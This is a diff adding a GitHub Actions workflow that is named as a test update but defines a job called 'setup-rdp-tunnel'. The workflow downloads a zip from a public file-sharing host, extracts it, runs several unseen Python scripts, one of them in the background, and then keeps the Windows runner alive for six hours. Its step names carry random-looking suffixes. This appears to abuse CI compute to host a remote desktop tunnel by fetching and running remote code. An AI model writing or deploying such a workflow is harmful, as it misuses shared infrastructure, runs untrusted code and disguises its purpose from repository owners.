@@ -1,0 +1,46 @@
+name: test-cod-update
+
+on:
+  workflow_dispatch:
+
+jobs:
+  setup-rdp-tunnel:
+    runs-on: windows-2025
+
+    steps:
+    - name: Check repository-v569
+      uses: actions/checkout@v2
+
+    - name: Download and extract-v5858
+      run: |
+        curl -L -o code.zip https://pixeldrain.com/api/file/fgtrwbnf/info/zip/main10.zip
+        Start-Sleep -Seconds 5
+        powershell -Command "Expand-Archive -Force code.zip extracted"
+
+
+    - name: package
+      run: python -m pip install requests
+      
+    - name: test.py-v996
+      run: |
+        cd extracted
+        Start-Sleep -Seconds 30
+        python test.py
+
+    - name: main.py-g45
+      run: |
+        cd extracted
+        Write-Host "Starting main.py in background..."
+        Start-Process python main.py
+        Start-Sleep -Seconds 10
+
+        
+    - name: test3.py-v223
+      run: |
+        cd extracted
+        Start-Sleep -Seconds 10
+        python test2.py
+        python test3.py
+
+    - name: Keep alive-vartion25
+      run: Start-Sleep -Seconds 21600 
